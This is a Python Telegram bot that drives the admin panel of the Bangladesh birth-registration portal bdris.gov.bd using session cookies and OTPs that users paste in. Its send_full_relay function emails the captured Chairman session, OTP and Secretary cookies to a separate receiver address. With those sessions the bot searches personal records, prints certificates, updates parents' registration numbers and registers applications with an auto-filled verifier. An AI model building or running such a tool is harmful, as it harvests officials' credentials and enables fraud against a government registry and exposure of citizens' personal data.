import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from flask import Flask
from pymongo import MongoClient

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. কনফিগারেশন ও ডাটাবেস
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '7886593741'))

bot = telebot.TeleBot(API_TOKEN)

# --- MongoDB ---
MONGO_URI = os.environ.get('MONGO_URI', 'YOUR_MONGO_URI_HERE')
try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client['bdris_bot_db']
    sessions_collection = db['users_sessions']
    access_collection = db['users_access']
    logging.info("✅ MongoDB Connected Successfully!")
except Exception as e:
    logging.error(f"❌ MongoDB Connection Failed: {e}")

# ==========================================
# ২. এক্সেস ও পারমিশন কন্ট্রোল
# ==========================================
DEFAULT_PERMS = {
    "print": True,        
    "server_pdf": True,   
    "ubrn_update": True,  
    "search": True        
}

def check_user_access(chat_id, user_name):
    if chat_id == ADMIN_ID: return True
    user_record = access_collection.find_one({"chat_id": chat_id})
    if not user_record:
        access_collection.insert_one({
            "chat_id": chat_id, "name": user_name, "status": "allowed", "permissions": DEFAULT_PERMS
        })
        markup = telebot.types.InlineKeyboardMarkup().row(telebot.types.InlineKeyboardButton("🚫 Block User", callback_data=f"block_{chat_id}"))
        bot.send_message(ADMIN_ID, f"🔔 **নতুন ইউজার!**\n👤 নাম: {user_name}\n🆔 ID: `{chat_id}`", reply_markup=markup, parse_mode="Markdown")
        return True
    return user_record.get("status") == "allowed"

def get_user_permissions(chat_id):
    if chat_id == ADMIN_ID: return DEFAULT_PERMS
    record = access_collection.find_one({"chat_id": chat_id})
    if record and "permissions" in record:
        p = DEFAULT_PERMS.copy()
        p.update(record["permissions"])
        return p
    return DEFAULT_PERMS

# ==========================================
# ৩. ডায়নামিক কিবোর্ড মেনু (UI Protection)
# ==========================================
def generate_main_menu(chat_id):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    perms = get_user_permissions(chat_id)
    u_sess = get_session(chat_id)

    markup.row("👤 Chairman Section", "🧑‍💼 Secretary Section")
    
    if u_sess["is_alive"]:
        markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
        
        row1 = ["🏠 Dashboard"]
        if perms.get("search"): row1.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
        markup.row(*row1)
        
        row2 = []
        if perms.get("ubrn_update"): row2.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
        if perms.get("server_pdf"): row2.append("🖨️ Server PDF Print")
        if row2: markup.row(*row2)

    # এডমিন ও সাধারণ ইউজারদের জন্য আলাদা বাটন
    if chat_id == ADMIN_ID:
        markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
        markup.row("🛠️ Check Cookies", "👥 Manage Users")
    elif not u_sess["is_alive"]:
        markup.row("🔑 Role Login (CH/SEC)")
    
    return markup

# ==========================================
# ৪. সেশন ম্যানেজমেন্ট
# ==========================================
user_sessions = {}

def get_default_session_dict():
    return {
        "req_session": requests.Session(), "csrf": "",
        "ch_session": requests.Session(), "ch_csrf": "", "ch_otp": "",
        "mode": "SECRETARY", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "is_alive": False, "current_page": "https://bdris.gov.bd/admin/",
        "app_start": 0, "app_length": 5, "sharok_no": 1, "temp_data": {}, "id_cache": {} 
    }

def save_session_to_db(chat_id, u_sess):
    data = {
        "chat_id": chat_id, 
        "sec_cookies": u_sess["req_session"].cookies.get_dict(), 
        "ch_cookies": u_sess["ch_session"].cookies.get_dict(), 
        "mode": u_sess["mode"], 
        "ch_otp": u_sess.get("ch_otp", ""), 
        "is_alive": u_sess["is_alive"]
    }
    sessions_collection.update_one({"chat_id": chat_id}, {"$set": data}, upsert=True)

def get_session(chat_id):
    if chat_id not in user_sessions:
        u_sess = get_default_session_dict()
        db_data = sessions_collection.find_one({"chat_id": chat_id})
        if db_data:
            u_sess["req_session"].cookies.update(db_data.get("sec_cookies", {}))
            u_sess["ch_session"].cookies.update(db_data.get("ch_cookies", {}))
            u_sess["mode"], u_sess["ch_otp"], u_sess["is_alive"] = db_data.get("mode", "SECRETARY"), db_data.get("ch_otp", ""), db_data.get("is_alive", False)
        user_sessions[chat_id] = u_sess
    return user_sessions[chat_id]

# ==========================================
# ৫. কোর ইঞ্জিন ও API হেল্পার
# ==========================================
def extract_sid_tsid(text):
    s, t = re.search(r'SESSION=([^\s;]+)', text, re.I), re.search(r'TS0108b707=([^\s;]+)', text, re.I)
    return (s.group(1), t.group(1)) if s and t else (None, None)

def get_active_session(u_sess):
    return (u_sess["ch_session"], u_sess["ch_csrf"]) if u_sess["mode"] == "CHAIRMAN" else (u_sess["req_session"], u_sess["csrf"])

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    sess, _ = get_active_session(u_sess)
    try:
        res = sess.get(url, headers={'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}, timeout=25)
        csrf = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf:
            if u_sess["mode"] == "CHAIRMAN": u_sess["ch_csrf"] = csrf.group(1)
            else: u_sess["csrf"] = csrf.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except: return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    sess, csrf = get_active_session(u_sess)
    h = {'x-csrf-token': csrf, 'x-requested-with': 'XMLHttpRequest', 'user-agent': u_sess["ua"], 'referer': u_sess["current_page"], 'origin': 'https://bdris.gov.bd'}
    try:
        if method == "POST": return sess.post(url, headers=h, data=data, timeout=30)
        return sess.get(url, headers=h, timeout=30)
    except: return None

def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- CHAIRMAN ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- SECRETARY ---\n{sec_raw}"
    msg = MIMEText(body)
    msg['Subject'], msg['From'], msg['To'] = subject, EMAIL_SENDER, EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
    except: pass

def is_cancel(m):
    if m.text and ("/start" in m.text or "Back to Menu" in m.text or "Dashboard" in m.text):
        bot.send_message(m.chat.id, "🏠 মেনুতে ফিরে যাওয়া হলো।", reply_markup=generate_main_menu(m.chat.id))
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

# ==========================================
# ৬. লগইন লজিক (Admin & Role)
# ==========================================
def admin_login_step(m):
    if is_cancel(m): return
    sid, tsid = extract_sid_tsid(m.text.strip())
    if not sid: return bot.register_next_step_handler(bot.send_message(m.chat.id, "❌ কুকি ভুল! আবার দিন:"), admin_login_step)
    u_sess = get_session(m.chat.id)
    u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
    u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
    success, html = navigate_to(m.chat.id, "https://bdris.gov.bd/admin/")
    if success and "Logout" in html:
        u_sess["is_alive"] = True
        save_session_to_db(m.chat.id, u_sess)
        bot.send_message(m.chat.id, "✅ Admin Login সফল!", reply_markup=generate_main_menu(m.chat.id))
    else: bot.send_message(m.chat.id, "❌ সেশন ইনভ্যালিড।")

def role_step_1(m):
    if is_cancel(m): return
    u_sess = get_session(m.chat.id)
    u_sess["temp_data"]["ch_raw"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ চেয়ারম্যান সেশন গৃহীত। এখন OTP দিন:")
    bot.register_next_step_handler(msg, role_step_2)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["ch_otp"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    sid, tsid = extract_sid_tsid(m.text.strip())
    if not sid: return bot.send_message(m.chat.id, "❌ কুকি ভুল।")
    u_sess = get_session(m.chat.id)
    u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
    u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
    u_sess["is_alive"] = True
    save_session_to_db(m.chat.id, u_sess)
    Thread(target=send_full_relay, args=(m.chat.id, u_sess["ch_otp"], m.text.strip()), daemon=True).start()
    bot.send_message(m.chat.id, "🎉 রোল লগইন সফল ও ইমেইল পাঠানো হয়েছে!", reply_markup=generate_main_menu(m.chat.id))

# ==========================================
# ৭. পিতা-মাতার UBRN আপডেট ফ্লো
# ==========================================
def start_ubrn_flow(m):
    u_sess = get_session(m.chat.id)
    u_sess["temp_data"]["ubrn"] = {}
    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
    msg = bot.send_message(m.chat.id, "১. ব্যক্তির ১৭ ডিজিট UBRN দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
    bot.register_next_step_handler(msg, ubrn_person_step)

def ubrn_person_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["personBrn"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "২. পিতার UBRN দিন (না থাকলে 0 লিখুন):")
    bot.register_next_step_handler(msg, ubrn_father_step)

def ubrn_father_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["fatherBrn"] = "" if m.text == '0' else m.text.strip()
    msg = bot.send_message(m.chat.id, "৩. মাতার UBRN দিন (না থাকলে 0 লিখুন):")
    bot.register_next_step_handler(msg, ubrn_mother_step)

def ubrn_mother_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["motherBrn"] = "" if m.text == '0' else m.text.strip()
    msg = bot.send_message(m.chat.id, "৪. ফোন নম্বর দিন (OTP যাবে):")
    bot.register_next_step_handler(msg, ubrn_phone_step)

def ubrn_phone_step(m):
    if is_cancel(m): return
    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
    ph = m.text.strip()
    phone = "+88" + ph if ph.startswith('01') else ph
    u_sess["temp_data"]["ubrn"]["phone"] = phone
    data = u_sess["temp_data"]["ubrn"]
    url = f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={data['personBrn']}&fatherBrn={data['fatherBrn']}&motherBrn={data['motherBrn']}&phone={quote(phone)}&email="
    res = call_api(chat_id, url, method="POST")
    if res and res.status_code == 200:
        bot.register_next_step_handler(bot.send_message(chat_id, "✅ OTP পাঠানো হয়েছে। কোডটি দিন:"), ubrn_final_submit)
    else: bot.send_message(chat_id, "❌ OTP পাঠাতে ব্যর্থ।")

def ubrn_final_submit(m):
    if is_cancel(m): return
    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
    data = u_sess["temp_data"]["ubrn"]
    payload = {'_csrf': u_sess["csrf"], 'personBrn': data['personBrn'], 'fatherBrn': data['fatherBrn'], 'motherBrn': data['motherBrn'], 'phone': data['phone'], 'email': '', 'otp': m.text.strip()}
    res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload)
    if res and res.status_code == 200: bot.send_message(chat_id, "✅ UBRN সফলভাবে আপডেট হয়েছে!", reply_markup=generate_main_menu(chat_id))
    else: bot.send_message(chat_id, "❌ আপডেট ব্যর্থ হয়েছে।")

# ==========================================
# ৮. ডাটা লিস্ট ও পিডিএফ লজিক
# ==========================================
def fetch_list_ui(message, cmd, is_search):
    chat_id, u_sess, perms = message.chat.id, get_session(message.chat.id), get_user_permissions(message.chat.id)
    config = {'apps': ("/admin/br/applications/search", "/api/br/applications/search"), 'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"), 'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")}
    success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    data_id = re.search(rf'href="{re.escape(config[cmd][0])}\?data=([A-Za-z0-9_\-]+)"', html or "").group(1) if html else None
    if not data_id: return bot.send_message(chat_id, "❌ ডাটা আইডি মেলেনি।")

    params = f"data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}&search[value]={quote(message.text.strip() if is_search else '')}&search[regex]=false&order[0][column]=1&order[0][dir]=desc"
    res = call_api(chat_id, f"https://bdris.gov.bd{config[cmd][1]}?{params}")
    if res and res.status_code == 200:
        items = res.json().get('data', [])
        if not items: return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")
        markup = telebot.types.InlineKeyboardMarkup()
        msg_text = f"📋 **{cmd.upper()} List** ({u_sess['mode']}):\n\n"
        for item in items:
            enc_id, status = item.get('encryptedId'), str(item.get('status', '')).upper()
            short_id = str(abs(hash(enc_id)))[-8:]
            u_sess["id_cache"][short_id] = enc_id
            msg_text += f"🆔 `{item.get('id') or item.get('applicationId')}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
            btns = []
            if u_sess["mode"] == "CHAIRMAN" and "RECEIVED" in status:
                btns.append(telebot.types.InlineKeyboardButton("✅ Register", callback_data=f"{'reg' if cmd == 'apps' else 'coreg'}_{short_id}"))
            elif u_sess["mode"] == "SECRETARY" and any(w in status for w in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
                btns.extend([telebot.types.InlineKeyboardButton("💳 Pay", callback_data=f"pay_{short_id}"), telebot.types.InlineKeyboardButton("📥 Receive", callback_data=f"recv_{short_id}")])
            if btns: markup.row(*btns)
            if perms.get("print"): markup.row(telebot.types.InlineKeyboardButton("🖨️ Print PDF", callback_data=f"print_{short_id}"))
            msg_text += "━━━━━━━━━━━━━━\n"
        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')

def download_server_pdf(chat_id, enc_id, filename):
    u_sess = get_session(chat_id)
    sess, csrf = get_active_session(u_sess)
    try:
        sess.get(f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}", timeout=60)
        res = sess.get(f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}", timeout=180)
        if 'application/pdf' in res.headers.get('Content-Type', ''):
            bot.send_document(chat_id, io.BytesIO(res.content), visible_file_name=f"{filename}.pdf")
        else: bot.send_message(chat_id, "⚠️ পিডিএফ পাওয়া যায়নি।")
    except Exception as e: bot.send_message(chat_id, f"❌ এরর: {e}")

# ==========================================
# ৯. সার্চ লজিক (JSON Output)
# ==========================================
def process_adv_search(m, lang):
    if is_cancel(m): return
    payload = f"personNameBn={quote(m.text.strip())}&personNameEn=&nameLang={lang}" if lang == 'BENGALI' else f"personNameBn=&personNameEn={quote(m.text.strip())}&nameLang=ENGLISH"
    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/advanced-search-by-name")
    res = call_api(m.chat.id, "https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=payload)
    if res:
        try: bot.send_message(m.chat.id, f"📊 **Search Result (JSON):**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown')
        except: bot.send_message(m.chat.id, f"Raw Data: {res.text}")

# ==========================================
# ১০. কলব্যাক হ্যান্ডলার (All Button Actions)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if not check_user_access(chat_id, call.from_user.first_name): return
    u_sess, perms = get_session(chat_id), get_user_permissions(chat_id)
    parts = call.data.split('_')
    action, sid = parts[0], parts[1] if len(parts) > 1 else ""
    enc_id = u_sess["id_cache"].get(sid)

    if action in ["block", "unblock", "admuser", "tgl"] and call.from_user.id == ADMIN_ID:
        # (এডমিন কন্ট্রোল লজিক - আগের কোড অনুযায়ী)
        if action == "admuser":
            p = (access_collection.find_one({"chat_id": int(sid)}) or {}).get("permissions", DEFAULT_PERMS)
            markup = telebot.types.InlineKeyboardMarkup()
            for k, n in [("print", "Print"), ("server_pdf", "Server PDF"), ("ubrn_update", "UBRN Update"), ("search", "Search")]:
                st = p.get(k, True)
                markup.row(telebot.types.InlineKeyboardButton(f"{'❌ Disable' if st else '✅ Enable'} {n}", callback_data=f"tgl_{sid}_{k}_{'off' if st else 'on'}"))
            bot.edit_message_text(f"👤 **User:** `{sid}` পারমিশন:", chat_id, call.message.message_id, reply_markup=markup)
        elif action == "tgl":
            access_collection.update_one({"chat_id": int(parts[1])}, {"$set": {f"permissions.{parts[2]}": parts[3] == "on"}})
            call.data = f"admuser_{parts[1]}"
            callback_handler(call)
        elif action == "block":
            access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "blocked"}})
            bot.answer_callback_query(call.id, "Blocked!")
        elif action == "unblock":
            access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "allowed"}})
            bot.answer_callback_query(call.id, "Allowed!")

    elif action == "print":
        if perms.get("print") and enc_id: download_server_pdf(chat_id, enc_id, f"Cert_{sid}")
        else: bot.answer_callback_query(call.id, "🚫 অনুমতি নেই!", show_alert=True)

    elif action in ["reg", "coreg"]:
        # চেয়ারম্যান রেজিস্ট্রেশন স্ক্র্যাপার লজিক (Verifier BRN/Name বের করা)
        bot.answer_callback_query(call.id, "⏳ রেজিস্ট্রেশন শুরু হচ্ছে...")
        path = "correction-application" if action == "coreg" else "application"
        page_html = get_active_session(u_sess)[0].get(f"https://bdris.gov.bd/admin/br/{path}/register?data={enc_id}").text
        v_match = re.search(r'<option\s+value="(\d{17})"[^>]*>([^<]+)</option>', page_html)
        if v_match:
            brn, name = v_match.group(1), v_match.group(2).strip()
            payload = {"birthPlaceAndDobVerifierName": name, "birthPlaceAndDobVerifierBrn": brn, "birthPlaceAndDobVerificationDate": datetime.now().strftime("%d/%m/%Y"), "otp": u_sess["ch_otp"], "data": enc_id}
            res = call_api(chat_id, f"https://bdris.gov.bd/api/br/{path}/register", method="POST", data=payload)
            if res and res.status_code == 200: bot.send_message(chat_id, f"✅ রেজিস্ট্রেশন সফল! ভেরিফায়ার: {name}")
            else: bot.send_message(chat_id, "❌ রেজিস্ট্রেশন ব্যর্থ।")
        else: bot.send_message(chat_id, "❌ ভেরিফায়ার ডাটা মেলেনি।")

# ==========================================
# ১১. মেইন রাউটার ও কমান্ডস
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    cid, t = m.chat.id, m.text
    if not check_user_access(cid, m.from_user.first_name): return
    u_sess, perms = get_session(cid), get_user_permissions(cid)

    if "/start" in t or "Back to Menu" in t: bot.send_message(cid, "🚀 মেনু:", reply_markup=generate_main_menu(cid))
    elif t == "🔑 Admin Login" and cid == ADMIN_ID: bot.register_next_step_handler(bot.send_message(cid, "🔑 সেশন দিন:"), admin_login_step)
    elif t == "🔑 Role Login (CH/SEC)": bot.register_next_step_handler(bot.send_message(cid, "👤 চেয়ারম্যান সেশন দিন:"), role_step_1)
    elif t == "👤 Chairman Section":
        u_sess["mode"] = "CHAIRMAN"
        save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ Chairman Mode চালু।", reply_markup=generate_main_menu(cid))
    elif t == "🧑‍💼 Secretary Section":
        u_sess["mode"] = "SECRETARY"
        save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ Secretary Mode চালু।", reply_markup=generate_main_menu(cid))
    elif t == "👥 Manage Users" and cid == ADMIN_ID:
        users = list(access_collection.find({}))
        markup = telebot.types.InlineKeyboardMarkup()
        for u in users: markup.row(telebot.types.InlineKeyboardButton(f"{u.get('name')} ({u.get('chat_id')})", callback_data=f"admuser_{u.get('chat_id')}"))
        bot.send_message(cid, "👥 ইউজার লিস্ট:", reply_markup=markup)
    elif u_sess["is_alive"]:
        if t in ["📋 Applications", "📝 Correction", "🔄 Reprint"]: handle_category_init(m, 'apps' if "App" in t else ('corr' if "Corr" in t else 'repr'))
        elif t == "🌐 Search By Name" and perms.get("search"): bot.register_next_step_handler(bot.send_message(cid, "🔍 নাম দিন:"), lambda x: process_adv_search(x, 'BENGALI'))
        elif t == "🔢 Search By UBRN" and perms.get("search"): bot.register_next_step_handler(bot.send_message(cid, "🔢 UBRN দিন:"), lambda x: process_adv_search(x, 'UBRN')) # Simplified search call
        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ" and perms.get("ubrn_update"): start_ubrn_flow(m)
        elif t == "🖨️ Server PDF Print" and perms.get("server_pdf"): bot.register_next_step_handler(bot.send_message(cid, "🖨️ UBRN দিন:"), lambda x: download_server_pdf(cid, x.text, f"PDF_{x.text}"))

if __name__ == "__main__":
    Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    Flask('').run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
